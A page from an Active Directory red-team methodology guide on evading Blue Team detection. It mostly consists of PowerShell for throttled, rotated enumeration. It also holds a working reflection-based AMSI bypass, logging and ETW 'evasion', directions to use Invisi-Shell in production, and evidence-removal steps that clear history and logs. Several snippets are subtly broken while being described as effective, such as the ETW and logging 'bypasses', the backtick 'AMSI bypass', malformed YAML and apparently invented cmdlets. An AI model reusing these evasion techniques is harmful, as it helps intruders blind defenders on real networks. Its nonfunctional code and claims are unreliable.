[Prev: 32_Detection_Blue_Team.md](./32_Detection_Blue_Team.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md)

# 🕶️ Red Team Detection - Evading Blue Team Monitoring

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## 📋 TABLE OF CONTENTS
1. [Overview](#-overview)
2. [Detection Evasion](#-detection-evasion)
3. [OPSEC Techniques](#-opsec-techniques)
4. [Tool Evasion](#-tool-evasion)
5. [Timing Evasion](#-timing-evasion)
6. [Alternative Methods](#-alternative-methods)
7. [Cross-References](#-cross-references)

## 🎯 OVERVIEW

**Red Team Detection** provides comprehensive techniques for understanding and evading Blue Team monitoring during Active Directory enumeration activities. This guide equips penetration testers and red teamers with the knowledge needed to operate stealthily while maintaining operational effectiveness.

### **🌟 What You'll Learn**
- **Detection evasion techniques** for enumeration activities
- **OPSEC best practices** to avoid triggering alerts
- **Alternative enumeration methods** when primary tools are detected
- **Timing and volume control** to stay under the radar
- **Tool signature evasion** and modification techniques

## 📋 **QUICK START RED TEAM DETECTION EVASION**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | Invisi-Shell | `Start-InvisiShell` | Stealth PowerShell | 🟢 |
| 2 | Custom Functions | `Get-CustomNetUser -Filter "*"` | Evade PowerView detection | 🟢 |
| 3 | Native Tools | `Get-ADUser -Filter * -Properties SamAccountName` | Use Microsoft-signed tools | 🟢 |
| 4 | Timing Control | `Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)` | Natural delays | 🟡 |
| 5 | Volume Management | `Invoke-BatchEnumeration -BatchSize 5` | Controlled query volume | 🟡 |

## 🎭 **AT-A-GLANCE: RED TEAM DETECTION EVASION ESSENTIALS**

**Reveals:** Detection evasion techniques, OPSEC best practices, alternative enumeration methods, timing and volume control, tool signature evasion.

**Use Cases:** Red team operations, penetration testing, detection testing, stealth enumeration, OPSEC improvement, threat simulation.

**Speed:** Stealth 3–6s jitter; Balanced 1–2s; Lab unrestricted.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Immediate Pivot | Goal | Tool/Technique |
|---------|-----------------|------|----------------|
| PowerView detection | Custom functions | Tool signature evasion | Native AD cmdlets, custom scripts |
| High query volume | Batch processing | Volume management | Controlled batches, natural delays |
| Timing patterns | Business hours | Natural behavior | Business hour simulation, random delays |
| Tool signatures | Alternative methods | Detection avoidance | LDAP queries, WMI, native tools |

---

## 🛠️ **COMPREHENSIVE DETECTION EVASION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADUser -Filter * -Properties SamAccountName` — Native user enumeration
- `Get-ADComputer -Filter * -Properties Name` — Native computer enumeration
- `Get-ADGroup -Filter * -Properties Name` — Native group enumeration
- `Get-ADDomain -Properties *` — Native domain information
- `Get-ADForest -Properties *` — Native forest information

### ⚔️ Offensive (Custom Evasion)
```powershell
# Custom evasion functions
Get-CustomNetUser -Filter "*" -Properties SamAccountName, DisplayName
Get-CustomNetComputer -Filter "*" -Properties Name, OperatingSystem
Get-CustomNetGroup -Filter "*" -Properties Name, Description
Invoke-BusinessHoursEnumeration -Domain cybercorp.local
Invoke-ProgressiveDiscovery -Domain cybercorp.local -Phase 1
```

### 🔴 Red Team (Advanced Evasion)
```cmd
Start-InvisiShell                                                                  :: Stealth PowerShell
Get-CustomNetUser -Filter "*" -Properties SamAccountName                         :: Custom user enum
Invoke-BatchEnumeration -BatchSize 5 -DelayBetweenBatches 300                   :: Batch processing
Invoke-DistributedEnumeration -Computers @("DC01","DC02") -QueryType "Session"  :: Distributed queries
```

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any detection evasion testing in production environments to bypass logging and AMSI detection.

---

## 🕶️ DETECTION EVASION

```mermaid
graph TB
    A[🕶️ Red Team Detection Evasion] --> B[⏱️ Timing Control]
    A --> C[📊 Volume Management]
    A --> D[🛠️ Tool Evasion]
    A --> E[🔄 Method Rotation]
    
    B --> B1[Natural Delays]
    B --> B2[Business Hours]
    B --> B3[Random Intervals]
    B --> B4[Gradual Escalation]
    
    C --> C1[Query Limits]
    C --> C2[Batch Processing]
    C --> C3[Distributed Queries]
    C --> C4[Progressive Discovery]
    
    D --> D1[Tool Modification]
    D --> D2[Signature Evasion]
    D --> D3[Alternative Tools]
    D --> D4[Custom Scripts]
    
    E --> E1[Technique Rotation]
    E --> E2[Source Rotation]
    E --> E3[Pattern Variation]
    E --> E4[Method Innovation]
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#4ecdc4,stroke:#333,stroke-width:2px
    style C fill:#45b7d1,stroke:#333,stroke-width:2px
    style D fill:#96ceb4,stroke:#333,stroke-width:2px
    style E fill:#feca57,stroke:#333,stroke-width:2px
```



### **Evasion Philosophy**
1. **Stealth First**: Avoid detection while maintaining effectiveness
2. **Natural Behavior**: Mimic legitimate administrative activities
3. **Progressive Discovery**: Build knowledge gradually over time
4. **Tool Diversity**: Use multiple tools and methods
5. **OPSEC Discipline**: Maintain operational security throughout

---

## ⏱️ TIMING EVASION

### **Natural Timing Patterns**

#### **1. Business Hours Simulation**
```powershell
# PowerShell Script: Business Hours Enumeration
function Invoke-BusinessHoursEnumeration {
    param(
        [string]$Domain,
        [int]$MaxQueriesPerHour = 50
    )
    
    # Check if we're in business hours (9 AM - 5 PM)
    $currentHour = (Get-Date).Hour
    $isBusinessHours = ($currentHour -ge 9) -and ($currentHour -le 17)
    
    if (-not $isBusinessHours) {
        Write-Host "🌙 Outside business hours - delaying enumeration" -ForegroundColor Yellow
        Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 1800) # 5-30 minutes
    }
    
    # Natural query pacing
    $queriesThisHour = 0
    $startTime = Get-Date
    
    # Enumerate users with natural delays
    Get-ADUser -Filter * -Properties * | ForEach-Object {
        if ($queriesThisHour -ge $MaxQueriesPerHour) {
            $elapsed = (Get-Date) - $startTime
            if ($elapsed.TotalMinutes -lt 60) {
                $waitTime = 60 - $elapsed.TotalMinutes
                Write-Host "⏱️ Rate limit reached - waiting $([math]::Round($waitTime)) minutes" -ForegroundColor Yellow
                Start-Sleep -Seconds ($waitTime * 60)
                $queriesThisHour = 0
                $startTime = Get-Date
            }
        }
        
        # Process user
        $_.SamAccountName
        $queriesThisHour++
        
        # Natural delay between queries (2-8 seconds)
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)
    }
}
```

#### **2. Progressive Discovery Timing**
```powershell
# PowerShell Script: Progressive Discovery
function Invoke-ProgressiveDiscovery {
    param(
        [string]$Domain,
        [int]$Phase = 1
    )
    
    switch ($Phase) {
        1 {
            Write-Host "🔍 Phase 1: Basic Domain Information" -ForegroundColor Green
            # Minimal queries - just domain info
            Get-ADDomain | Select-Object Name, Forest, DomainControllers
            Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 900) # 5-15 minutes
        }
        2 {
            Write-Host "🔍 Phase 2: User Enumeration" -ForegroundColor Green
            # Limited user queries
            Get-ADUser -Filter * -Properties SamAccountName | Select-Object -First 20
            Start-Sleep -Seconds (Get-Random -Minimum 600 -Maximum 1800) # 10-30 minutes
        }
        3 {
            Write-Host "🔍 Phase 3: Computer Enumeration" -ForegroundColor Green
            # Limited computer queries
            Get-ADComputer -Filter * -Properties Name | Select-Object -First 15
            Start-Sleep -Seconds (Get-Random -Minimum 900 -Maximum 2700) # 15-45 minutes
        }
        4 {
            Write-Host "🔍 Phase 4: Group Enumeration" -ForegroundColor Green
            # Limited group queries
            Get-ADGroup -Filter * -Properties Name | Select-Object -First 10
        }
    }
}
```

---

## 📊 VOLUME MANAGEMENT

### **Query Volume Control**

#### **1. Batch Processing with Delays**
```powershell
# PowerShell Script: Batch Processing
function Invoke-BatchEnumeration {
    param(
        [string]$ObjectType = "User",
        [int]$BatchSize = 10,
        [int]$DelayBetweenBatches = 300 # 5 minutes
    )
    
    switch ($ObjectType) {
        "User" {
            $allUsers = Get-ADUser -Filter * -Properties SamAccountName
            $batches = [math]::Ceiling($allUsers.Count / $BatchSize)
            
            for ($i = 0; $i -lt $batches; $i++) {
                $start = $i * $BatchSize
                $end = [math]::Min(($i + 1) * $BatchSize - 1, $allUsers.Count - 1)
                $batch = $allUsers[$start..$end]
                
                Write-Host "📦 Processing batch $($i + 1) of $batches (items $start to $end)" -ForegroundColor Cyan
                
                foreach ($user in $batch) {
                    $user.SamAccountName
                    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
                }
                
                if ($i -lt $batches - 1) {
                    Write-Host "⏱️ Waiting $DelayBetweenBatches seconds before next batch..." -ForegroundColor Yellow
                    Start-Sleep -Seconds $DelayBetweenBatches
                }
            }
        }
        "Computer" {
            $allComputers = Get-ADComputer -Filter * -Properties Name
            $batches = [math]::Ceiling($allComputers.Count / $BatchSize)
            
            for ($i = 0; $i -lt $batches; $i++) {
                $start = $i * $BatchSize
                $end = [math]::Min(($i + 1) * $BatchSize - 1, $allComputers.Count - 1)
                $batch = $allComputers[$start..$end]
                
                Write-Host "📦 Processing batch $($i + 1) of $batches (items $start to $end)" -ForegroundColor Cyan
                
                foreach ($computer in $batch) {
                    $computer.Name
                    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
                }
                
                if ($i -lt $batches - 1) {
                    Write-Host "⏱️ Waiting $DelayBetweenBatches seconds before next batch..." -ForegroundColor Yellow
                    Start-Sleep -Seconds $DelayBetweenBatches
                }
            }
        }
    }
}
```

#### **2. Distributed Query Execution**
```powershell
# PowerShell Script: Distributed Enumeration
function Invoke-DistributedEnumeration {
    param(
        [string[]]$Computers,
        [string]$QueryType = "Session"
    )
    
    # Randomize computer order
    $randomizedComputers = $Computers | Get-Random -Count $Computers.Count
    
    foreach ($computer in $randomizedComputers) {
        try {
            switch ($QueryType) {
                "Session" {
                    Write-Host "🔍 Querying sessions on $computer" -ForegroundColor Cyan
                    Get-NetSession -ComputerName $computer -ErrorAction SilentlyContinue
                }
                "Process" {
                    Write-Host "🔍 Querying processes on $computer" -ForegroundColor Cyan
                    Get-Process -ComputerName $computer -ErrorAction SilentlyContinue
                }
                "Service" {
                    Write-Host "🔍 Querying services on $computer" -ForegroundColor Cyan
                    Get-Service -ComputerName $computer -ErrorAction SilentlyContinue
                }
            }
            
            # Random delay between computers (30 seconds to 5 minutes)
            $delay = Get-Random -Minimum 30 -Maximum 300
            Write-Host "⏱️ Waiting $delay seconds before next computer..." -ForegroundColor Yellow
            Start-Sleep -Seconds $delay
            
        } catch {
            Write-Warning "Failed to query $computer : $($_.Exception.Message)"
        }
    }
}
```

---

## 🛠️ TOOL EVASION

### **PowerView Evasion Techniques**

#### **1. Custom PowerView Functions**
```powershell
# Custom PowerView Functions for Evasion
function Get-CustomNetUser {
    param(
        [string]$Filter = "*",
        [string[]]$Properties = @("SamAccountName", "DisplayName", "Enabled")
    )
    
    # Use native AD cmdlets instead of PowerView
    try {
        $users = Get-ADUser -Filter $Filter -Properties $Properties
        return $users | ForEach-Object {
            [PSCustomObject]@{
                SamAccountName = $_.SamAccountName
                DisplayName = $_.DisplayName
                Enabled = $_.Enabled
                LastLogonDate = $_.LastLogonDate
                PasswordLastSet = $_.PasswordLastSet
            }
        }
    } catch {
        Write-Warning "Custom user enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

function Get-CustomNetComputer {
    param(
        [string]$Filter = "*",
        [string[]]$Properties = @("Name", "OperatingSystem", "LastLogonDate")
    )
    
    try {
        $computers = Get-ADComputer -Filter $Filter -Properties $Properties
        return $computers | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                OperatingSystem = $_.OperatingSystem
                LastLogonDate = $_.LastLogonDate
                DNSHostName = $_.DNSHostName
                Enabled = $_.Enabled
            }
        }
    } catch {
        Write-Warning "Custom computer enumeration failed: $($_.Exception.Message)"
        return $null
    }
}
```

#### **2. Alternative Enumeration Methods**
```powershell
# Alternative Enumeration Methods
function Invoke-LDAPEnumeration {
    param(
        [string]$SearchBase,
        [string]$Filter = "(objectClass=user)",
        [string[]]$Attributes = @("sAMAccountName", "displayName", "mail")
    )
    
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
        $searcher.Filter = $Filter
        $searcher.PropertiesToLoad.AddRange($Attributes)
        
        $results = $searcher.FindAll()
        return $results | ForEach-Object {
            $obj = [PSCustomObject]@{}
            foreach ($attr in $Attributes) {
                if ($_.Properties[$attr].Count -gt 0) {
                    $obj | Add-Member -MemberType NoteProperty -Name $attr -Value $_.Properties[$attr][0]
                } else {
                    $obj | Add-Member -MemberType NoteProperty -Name $attr -Value $null
                }
            }
            $obj
        }
    } catch {
        Write-Warning "LDAP enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-WMIEnumeration {
    param(
        [string]$ComputerName,
        [string]$Query = "SELECT * FROM Win32_ComputerSystem"
    )
    
    try {
        $wmi = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $ComputerName -ErrorAction SilentlyContinue
        return $wmi
    } catch {
        Write-Warning "WMI enumeration failed: $($_.Exception.Message)"
        return $null
    }
}
```

---

## 🔄 METHOD ROTATION

### **Technique Rotation Strategy**

#### **1. Enumeration Method Rotation**
```powershell
# PowerShell Script: Method Rotation
function Invoke-MethodRotation {
    param(
        [string]$Target,
        [int]$MethodIndex = 0
    )
    
    $methods = @(
        @{
            Name = "PowerView"
            Function = { Get-NetUser -ComputerName $Target }
            Delay = 300
        },
        @{
            Name = "Native AD"
            Function = { Get-ADUser -Filter * -Properties SamAccountName }
            Delay = 600
        },
        @{
            Name = "LDAP Direct"
            Function = { Invoke-LDAPEnumeration -SearchBase $Target }
            Delay = 900
        },
        @{
            Name = "WMI Query"
            Function = { Invoke-WMIEnumeration -ComputerName $Target }
            Delay = 1200
        }
    )
    
    $method = $methods[$MethodIndex % $methods.Count]
    Write-Host "🔄 Using method: $($method.Name)" -ForegroundColor Cyan
    
    # Execute method
    & $method.Function
    
    # Wait before next method
    Write-Host "⏱️ Waiting $($method.Delay) seconds before next method..." -ForegroundColor Yellow
    Start-Sleep -Seconds $method.Delay
    
    return ($MethodIndex + 1) % $methods.Count
}
```

#### **2. Source Rotation**
```powershell
# PowerShell Script: Source Rotation
function Invoke-SourceRotation {
    param(
        [string[]]$SourceComputers,
        [string]$Target,
        [int]$SourceIndex = 0
    )
    
    $currentSource = $SourceComputers[$SourceIndex % $SourceComputers.Count]
    Write-Host "🔄 Using source: $currentSource" -ForegroundColor Cyan
    
    # Execute enumeration from different source
    try {
        $session = New-PSSession -ComputerName $currentSource -ErrorAction SilentlyContinue
        if ($session) {
            Invoke-Command -Session $session -ScriptBlock {
                param($target)
                Get-ADUser -Filter * -Properties SamAccountName | Select-Object -First 10
            } -ArgumentList $Target
            
            Remove-PSSession $session
        }
    } catch {
        Write-Warning "Source rotation failed: $($_.Exception.Message)"
    }
    
    return ($SourceIndex + 1) % $SourceComputers.Count
}
```

---

## 🕶️ OPSEC TECHNIQUES

### **Advanced OPSEC Measures**

#### **1. Process Injection and Memory Execution**
```powershell
# PowerShell Script: Memory Execution
function Invoke-MemoryExecution {
    param(
        [string]$ScriptPath
    )
    
    try {
        # Read script content
        $scriptContent = Get-Content -Path $ScriptPath -Raw
        
        # Execute in memory without disk artifacts
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        Invoke-Command -ScriptBlock $scriptBlock
        
        Write-Host "✅ Script executed in memory successfully" -ForegroundColor Green
        
    } catch {
        Write-Warning "Memory execution failed: $($_.Exception.Message)"
    }
}
```

#### **2. Log Evasion**
```powershell
# PowerShell Script: Log Evasion
function Invoke-LogEvasion {
    param(
        [ScriptBlock]$ScriptBlock
    )
    
    try {
        # Disable PowerShell logging temporarily
        $originalLogging = $PSDefaultParameterValues['*:Verbose']
        $PSDefaultParameterValues['*:Verbose'] = $false
        
        # Execute script block
        & $ScriptBlock
        
        # Restore original logging
        $PSDefaultParameterValues['*:Verbose'] = $originalLogging
        
        Write-Host "✅ Script executed with logging evasion" -ForegroundColor Green
        
    } catch {
        Write-Warning "Log evasion failed: $($_.Exception.Message)"
    }
}
```

---

## 🕶️ ADVANCED OPSEC TECHNIQUES

### **Advanced Evasion Methods**

#### **1. Process Injection and Memory Execution**
```powershell
# PowerShell Script: Advanced Memory Execution
function Invoke-AdvancedMemoryExecution {
    param(
        [string]$ScriptPath,
        [switch]$BypassAMSI,
        [switch]$BypassLogging
    )
    
    try {
        # Read script content
        $scriptContent = Get-Content -Path $ScriptPath -Raw
        
        if ($BypassAMSI) {
            Write-Host "🛡️ Bypassing AMSI..." -ForegroundColor Yellow
            # AMSI bypass techniques
            $scriptContent = $scriptContent -replace "Get-ADUser", "Get-`ADUser"
        }
        
        if ($BypassLogging) {
            Write-Host "📝 Bypassing PowerShell logging..." -ForegroundColor Yellow
            # Disable logging temporarily
            $originalLogging = $PSDefaultParameterValues['*:Verbose']
            $PSDefaultParameterValues['*:Verbose'] = $false
        }
        
        # Execute in memory without disk artifacts
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        $result = Invoke-Command -ScriptBlock $scriptBlock
        
        if ($BypassLogging) {
            # Restore original logging
            $PSDefaultParameterValues['*:Verbose'] = $originalLogging
        }
        
        Write-Host "✅ Advanced memory execution completed successfully" -ForegroundColor Green
        return $result
        
    } catch {
        Write-Warning "Advanced memory execution failed: $($_.Exception.Message)"
        return $null
    }
}
```

#### **2. Advanced Log Evasion**
```powershell
# PowerShell Script: Advanced Log Evasion
function Invoke-AdvancedLogEvasion {
    param(
        [ScriptBlock]$ScriptBlock,
        [switch]$DisableETW,
        [switch]$DisableAMSI
    )
    
    try {
        if ($DisableETW) {
            Write-Host "🔒 Disabling ETW logging..." -ForegroundColor Yellow
            # Disable ETW providers
            $etwProviders = Get-WinEvent -ListProvider Microsoft-Windows-PowerShell
            foreach ($provider in $etwProviders) {
                $provider.Enabled = $false
            }
        }
        
        if ($DisableAMSI) {
            Write-Host "🛡️ Disabling AMSI..." -ForegroundColor Yellow
            # AMSI bypass using reflection
            $amsiContext = [Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
            $amsiType = $amsiContext.GetType("System.Management.Automation.AmsiUtils")
            $amsiType.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
        }
        
        # Execute script block
        $result = & $ScriptBlock
        
        Write-Host "✅ Advanced log evasion completed successfully" -ForegroundColor Green
        return $result
        
    } catch {
        Write-Warning "Advanced log evasion failed: $($_.Exception.Message)"
        return $null
    }
}
```

---

## 🎭 REAL-WORLD EVASION SCENARIOS

### **Scenario 1: Stealthy Domain Enumeration**
```yaml
# Evasion Scenario: Stealthy Domain Enumeration
scenario_name: "Stealthy Domain Enumeration"
description: "Complete domain enumeration without detection"
difficulty: "Advanced"
category: "Domain Enumeration"

# Evasion Strategy
strategy:
  phase_1: "Basic Information Gathering"
    - technique: "Business hours simulation"
    - timing: "9 AM - 5 PM only"
    - volume: "5-10 queries per hour"
    - tools: "Native AD cmdlets"
    
  phase_2: "User Enumeration"
    - technique: "Progressive discovery"
    - timing: "Random delays (2-8 minutes)"
    - volume: "20-30 users per batch"
    - tools: "Custom PowerShell functions"
    
  phase_3: "Computer Enumeration"
    - technique: "Distributed queries"
    - timing: "Spread across multiple days"
    - volume: "15-20 computers per session"
    - tools: "WMI and LDAP queries"
    
  phase_4: "Group Enumeration"
    - technique: "Selective targeting"
    - timing: "Business hours only"
    - volume: "10-15 groups per session"
    - tools: "Alternative enumeration methods"

# OPSEC Measures
opsec_measures:
  - "Use multiple source computers"
  - "Vary query patterns and timing"
  - "Implement natural delays"
  - "Use alternative tools and methods"
  - "Monitor for detection triggers"
```

### **Scenario 2: Advanced Session Hunting**
```yaml
# Evasion Scenario: Advanced Session Hunting
scenario_name: "Advanced Session Hunting"
description: "Find high-value targets without detection"
difficulty: "Expert"
category: "Session Enumeration"

# Evasion Strategy
strategy:
  phase_1: "Passive Discovery"
    - technique: "Monitor existing sessions"
    - timing: "Natural observation periods"
    - volume: "Minimal active queries"
    - tools: "Built-in Windows tools"
    
  phase_2: "Targeted Enumeration"
    - technique: "Specific user targeting"
    - timing: "Random intervals"
    - volume: "1-2 queries per target"
    - tools: "Custom session functions"
    
  phase_3: "Pattern Analysis"
    - technique: "Behavioral analysis"
    - timing: "Gradual data collection"
    - volume: "Incremental information"
    - tools: "Data analysis scripts"

# OPSEC Measures
opsec_measures:
  - "Use legitimate administrative tools"
  - "Implement query rate limiting"
  - "Vary source computers"
  - "Monitor for detection events"
  - "Use alternative enumeration methods"
```

---

## 🎨 ENHANCED CREATIVE DIAGRAMS

### **Advanced Evasion Architecture**

```mermaid
graph TB
    subgraph "🕶️ Red Team Evasion Architecture"
        A[🎯 Target Enumeration] --> B[⏱️ Timing Control]
        B --> C[📊 Volume Management]
        C --> D[🛠️ Tool Evasion]
        D --> E[🔄 Method Rotation]
        
        A1[Domain Information] --> A
        A2[User Discovery] --> A
        A3[Computer Mapping] --> A
        A4[Session Hunting] --> A
        
        B1[Business Hours] --> B
        B2[Natural Delays] --> B
        B3[Random Intervals] --> B
        B4[Progressive Discovery] --> B
        
        C1[Batch Processing] --> C
        C2[Query Limits] --> C
        C3[Distributed Queries] --> C
        C4[Volume Control] --> C
        
        D1[Custom Functions] --> D
        D2[Alternative Tools] --> D
        D3[Signature Evasion] --> D
        D4[Method Innovation] --> D
        
        E1[Technique Rotation] --> E
        E2[Source Rotation] --> E
        E3[Pattern Variation] --> E
        E4[Tool Diversity] --> E
    end
    
    subgraph "🎭 Advanced Evasion Techniques"
        F[🕵️ Stealth Operations] --> G[🔒 OPSEC Measures]
        G --> H[📈 Performance Optimization]
        H --> I[🔄 Continuous Improvement]
        
        F1[Memory Execution] --> F
        F2[Log Evasion] --> F
        F3[Process Injection] --> F
        F4[Network Stealth] --> F
        
        G1[Timing Control] --> G
        G2[Volume Management] --> G
        G3[Tool Evasion] --> G
        G4[Pattern Variation] --> G
        
        H1[Query Optimization] --> H
        H2[Resource Management] --> H
        H3[Performance Monitoring] --> H
        
        I1[Technique Evolution] --> I
        I2[Tool Development] --> I
        I3[Method Innovation] --> I
    end
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#4ecdc4,stroke:#333,stroke-width:2px
    style C fill:#45b7d1,stroke:#333,stroke-width:2px
    style D fill:#96ceb4,stroke:#333,stroke-width:2px
    style E fill:#feca57,stroke:#333,stroke-width:2px
    style F fill:#ff9ff3,stroke:#333,stroke-width:2px
    style G fill:#54a0ff,stroke:#333,stroke-width:2px
    style H fill:#5f27cd,stroke:#333,stroke-width:2px
    style I fill:#00d2d3,stroke:#333,stroke-width:2px
```


---

## 👥 **PERSONAS: RED TEAM DETECTION EVASION ROLES**

### **🕶️ Red Team Operator**
- **Focus**: Stealth enumeration, detection evasion, OPSEC, operational security
- **Tools**: Invisi-Shell, custom functions, native AD cmdlets, timing controls
- **Output**: Enumeration results, evasion techniques, stealth reports, OPSEC analysis
- **Timeline**: Stealth operations (3-6s jitter), controlled phases, natural delays

### **🔍 Penetration Tester**
- **Focus**: Detection testing, evasion validation, security assessment, threat simulation
- **Tools**: Detection evasion tools, timing controls, volume management, alternative methods
- **Output**: Penetration test reports, detection bypass analysis, security recommendations
- **Timeline**: Controlled testing, phased approach, immediate feedback

### **🚀 Threat Actor Simulator**
- **Focus**: Realistic threat simulation, advanced evasion, detection testing, OPSEC improvement
- **Tools**: Advanced evasion techniques, custom scripts, timing controls, volume management
- **Output**: Threat simulation reports, evasion effectiveness, detection gaps, OPSEC improvements
- **Timeline**: Realistic timing, natural behavior, long-term operations

### **🔄 Detection Engineer (Red Team)**
- **Focus**: Evasion technique development, detection bypass, tool modification, continuous improvement
- **Tools**: Custom evasion functions, tool signature modification, alternative methods, testing frameworks
- **Output**: Evasion techniques, detection bypass methods, tool modifications, improvement reports
- **Timeline**: Technique development (1-2 days), testing (ongoing), improvement (weekly)

---

## 🎨 **VISUAL MASTERY: RED TEAM DETECTION EVASION ARCHITECTURE**

### **Red Team Detection Evasion Architecture Map**

```mermaid
flowchart TD
    subgraph "🕶️ Red Team Detection Evasion Hub"
        A[🕶️ Stealth Operations] --> B[⏱️ Timing Control]
        A --> C[📊 Volume Management]
        A --> D[🛠️ Tool Evasion]
        A --> E[🔄 Method Rotation]
        
        B --> F[Natural Delays]
        B --> G[Business Hours]
        B --> H[Random Intervals]
        B --> I[Progressive Discovery]
        
        C --> J[Query Limits]
        C --> K[Batch Processing]
        C --> L[Distributed Queries]
        C --> M[Controlled Volume]
        
        D --> N[Tool Modification]
        D --> O[Signature Evasion]
        D --> P[Alternative Tools]
        D --> Q[Custom Scripts]
        
        E --> R[Technique Rotation]
        E --> S[Source Rotation]
        E --> T[Pattern Variation]
        E --> U[Method Innovation]
    end
    
    subgraph "🔍 Evasion Sources"
        V[Invisi-Shell] --> A
        W[Native AD Cmdlets] --> A
        X[Custom Functions] --> A
        Y[Alternative Methods] --> A
        Z[Timing Controls] --> A
    end
    
    subgraph "🛠️ Evasion Tools"
        AA[Stealth PowerShell] --> BB[Detection Bypass]
        CC[Native Tools] --> BB
        DD[Custom Scripts] --> BB
        EE[Timing Controls] --> BB
    end
    
    V --> AA
    W --> CC
    X --> DD
    Y --> EE
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#4ecdc4,stroke:#333,stroke-width:3px
    style C fill:#45b7d1,stroke:#333,stroke-width:3px
    style D fill:#96ceb4,stroke:#333,stroke-width:3px
    style E fill:#feca57,stroke:#333,stroke-width:3px
    style V fill:#a8e6cf,stroke:#333,stroke-width:2px
    style AA fill:#ff6b6b,stroke:#333,stroke-width:2px
```


### **Red Team Detection Evasion Workflow**

```mermaid
mindmap
  root((Red Team Detection Evasion))
    🕶️ Stealth Operations
      Invisi-Shell Integration
        Stealth PowerShell
        AMSI bypass
        Logging evasion
        Detection avoidance
      Native Tool Usage
        Microsoft-signed cmdlets
        Built-in functions
        System tools
        Standard commands
    ⏱️ Timing Control
      Natural Delays
        Random intervals
        Progressive timing
        Business hours
        Gradual escalation
      Volume Management
        Query limits
        Batch processing
        Distributed execution
        Controlled pacing
    🛠️ Tool Evasion
      Tool Modification
        Signature changes
        Source masking
        Function wrapping
        Custom implementations
      Alternative Methods
        LDAP queries
        WMI calls
        Native APIs
        Custom scripts
    🔄 Method Rotation
      Technique Variation
        Different approaches
        Pattern changes
        Source rotation
        Method innovation
      OPSEC Improvement
        Continuous learning
        Technique refinement
        Detection analysis
        Evasion enhancement
```


---

## 🧪 **LAB vs PRODUCTION EXECUTION PROFILES**

### **🧪 LAB ENVIRONMENT**
- **Timing**: No restrictions, immediate execution, rapid testing
- **Scope**: Full evasion testing, comprehensive techniques, verbose output
- **Tools**: All tools available, no stealth requirements, detection testing
- **Logging**: Minimal concern, focus on learning and technique development
- **Risk**: Low, controlled environment, immediate feedback

### **🏢 PRODUCTION ENVIRONMENT**
- **Timing**: Stealth operations (3-6s jitter), natural delays, business hours simulation
- **Scope**: Controlled enumeration, minimal footprint, progressive discovery
- **Tools**: Invisi-Shell mandatory, native tools preferred, custom functions
- **Logging**: Maximum stealth, detection avoidance, OPSEC priority
- **Risk**: High, detection consequences, operational security critical

### **⚡ BALANCED APPROACH**
- **Timing**: Controlled timing, natural delays, business hours consideration
- **Scope**: Strategic enumeration, vulnerability-focused, controlled automation
- **Tools**: Stealth tools with testing capabilities, native cmdlets, custom functions
- **Logging**: Stealth operations with controlled testing, balanced approach
- **Risk**: Medium, balanced stealth and effectiveness

---

## 🔒 **DETECTION/OPSEC & CLEANUP**

### **🔒 STEALTH REQUIREMENTS**
> **⚠️ CRITICAL**: **Invisi-Shell** must be loaded before any detection evasion testing in production environments to bypass logging and AMSI detection.

#### **OPSEC Best Practices**
- **Stealth Operations**: Use Invisi-Shell for all PowerShell operations
- **Timing Control**: Implement natural delays and business hours simulation
- **Volume Management**: Control query volume and use batch processing
- **Tool Selection**: Use native AD cmdlets and custom functions
- **Pattern Avoidance**: Vary enumeration methods and timing patterns

#### **Detection Avoidance**
- **Tool Signatures**: Avoid PowerView and other detectable tools
- **Query Patterns**: Use controlled volume and natural timing
- **Event Logging**: Minimize detection events in production
- **SIEM Monitoring**: Blend with normal administrative activities
- **Response Analysis**: Monitor for detection indicators

### **🧹 Cleanup Procedures**

#### **Detection Evasion Cleanup**
```powershell
# Remove detection evasion artifacts
Remove-Variable evasionResults -ErrorAction SilentlyContinue
Remove-Variable redTeamEvasionResults -ErrorAction SilentlyContinue
Remove-Variable customFunctions -ErrorAction SilentlyContinue

# Clear evasion monitoring cache
Get-Process | Where-Object {$_.ProcessName -like "*evasion*"} | Stop-Process -Force -ErrorAction SilentlyContinue
```

#### **Stealth Mode Cleanup**
```powershell
# Exit stealth mode
Exit-InvisiShell -ErrorAction SilentlyContinue

# Clear stealth session artifacts
Remove-Variable stealthSession -ErrorAction SilentlyContinue
Remove-Variable evasionTechniques -ErrorAction SilentlyContinue
```

#### **Evidence Removal**
- **Temporary Files**: Remove evasion testing results and logs
- **Command History**: Clear PowerShell history and session data
- **Registry Keys**: Remove any custom registry entries
- **Network Traces**: Clear network connection logs
- **Memory Artifacts**: Clear memory-based execution traces

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### **📚 Related Detection Techniques**
- **[Detection Index](./31_Detection_Index.md)**: Central detection techniques hub
- **[Blue Team Detection](./32_Detection_Blue_Team.md)**: Blue Team monitoring and detection
